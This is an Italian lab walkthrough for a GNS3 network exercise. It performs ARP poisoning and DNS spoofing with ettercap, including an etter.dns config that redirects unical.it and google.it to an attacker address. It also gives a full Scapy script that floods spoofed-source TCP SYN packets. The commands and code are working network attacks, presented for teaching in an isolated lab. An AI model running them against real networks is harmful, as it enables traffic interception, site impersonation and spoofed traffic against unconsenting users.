# ARP Poisoning

## Su R1

Prendi nota del mac del router

```bash
# On R1
$ show ip arp
```

## Su DARTH

Installa ettercap su darth

```bash
# On Darth
$ sudo apt update && sudo apt install ettercap-text-only
$ sudo sysctl -w net.ipv4.ip_forward=1


# Edita il file di configurazione di ettercap e
# decommenta la riga che inizia con redir_command_on e redir_command_off
$ sudo nano /etc/ettercap/etter.conf

```

Prendi nota dell'IP e del MAC della vittima (in questo caso alice). Fai una scansione con ettercap e poi premi `spacebar` to enable/disable packets view e `l` (lowercase `L`) per visualizzare le informazioni sui devices trovati. Scegli il tuo target e poi premi `q` per uscire.

```bash
# Scansione completa della rete con ettercap per ottenere informazioni sulla rete
$ sudo ettercap -T

# Esempio di scansione nel mio lab GNS3

Hosts list:

1)	10.0.0.1	CA:01:A9:37:00:06 # Router
2)	10.0.0.2	0C:D1:8F:AD:00:00 #
3)	10.0.0.4	0C:44:2E:4B:00:00 #
4)	10.0.0.20	0C:44:2E:4B:00:00 # Alice
5)	10.0.0.21	0C:D1:8F:AD:00:00 # Bob

```

Con IP/MAC della vittima ora avvia nuovamente ettercap per lanciare l'attacco

```bash
$ sudo ettercap -T -M arp //10.0.0.20/ //10.0.0.21/
```

## Su R1

con v1 stiamo avvelenando la tabella di R1 quindi

```bash
# Verifica della tabella avvelenata
show ip arp
```

## Su BOB

```bash
# verifichiamo che sia andata a buon fine la sostituzione
ping 10.0.0.20 # ip alice
```

## Sulla macchina hosts

- Controlla con Wireshark il traffico all'interno del laboratorio

# DNS Spoofing

## Prerequisiti

- Il laboratorio GNS3 e' il medesimo dell'attacco precedente
- Non e' necessario aver gia' stabilito un ARP poisoning perche' ettercap lo fara' per te dietro le quinte!
- Darth deve avere un web server installato e funzionante (Apache, Nginx, o quello che preferisci)

## Su DARTH

```bash

# Configurazione del DNS Server Malevolo
# Ogni linea ha il seguente formato:
# <Website> <DNS_Query_Type> <Attacker_IP_Address>
# aggiungiamo quelle relative al sito dell'unical
#        unical.it        A       10.0.0.200
#        *.unical.it      A       10.0.0.200
#        www.unical.it    PTR     10.0.0.200

#        google.it        A       10.0.0.200
#        *.google.it      A       10.0.0.200
#        www.google.it    PTR     10.0.0.200
$ sudo nano /etc/ettercap/etter.dns

## Possiamo lanciare l'attacco!
## -T: Modalità interfaccia testuale (senza interfaccia grafica)
## -q: Modalità silenziosa (output minimo)
## -i [interfaccia]: Specifica quale interfaccia di rete utilizzare (ad esempio, eth0, wlan0)
## -M arp: Attiva il poisoning ARP
## /[ip_vittima]//: Specificazione del target per la vittima (primo parametro)
## /[ip_gateway]//: Specificazione del target per il gateway/router (secondo parametro)
## -P dns_spoof: Attiva il plugin di spoofing DNS
##

$ sudo ettercap -T -q -M arp /10.0.0.20// /10.0.0.1// -P dns_spoof

```

## Su ALICE

```bash
$ curl -L google.it
```

## Su BOB

```bash
$ curl -L google.it
```

# IP Spoofing

## Su R1

```bash
show ip arp
```

## Su DARTH

```bash
$ sudo apt install nmap scapy typer # ti serve spazio!
$ sudo nmap -sPn 10.0.0.0/24
$ sudo python3 ip_spoofer.py  <ip-da-spoofare> <ip-destinazione>
```

## Su R1

```bash
show ip arp
```

## Su BOB (se vittima Alice, altrimenti su Alice)

```bash
$ ping 10.0.0.20 # ip alice nel mio caso
```

## Sulla macchina hosts

- Controlla con Wireshark il traffico all'interno del laboratorio

### Codice ip_spoofer.py

```python

#!/usr/bin/env python3
from scapy.all import IP, TCP, send, RandShort
import sys
import time

if len(sys.argv) != 3:
    print(f"Uso: {sys.argv[0]} <ip-da-spoofare> <ip-destinazione>")
    sys.exit(1)

# Se voglio far creadere a Bob che il pacchetto arrivi da Alice
ip_spoofato = sys.argv[1] # Alice
ip_vittima = sys.argv[2] # Bob

count = 0

# RandShort porta sorgente random

try:
    while True:
        pkt = IP(src=ip_spoofato, dst=ip_vittima) / TCP(sport=RandShort(), dport=80, flags="S")
        send(pkt, verbose=0)
        count += 1
        print(f"\rPacchetti inviati: {count}", end="")
        time.sleep(0.5)
except KeyboardInterrupt:
    print(f"\nAttacco terminato. Pacchetti inviati: {count}")

```


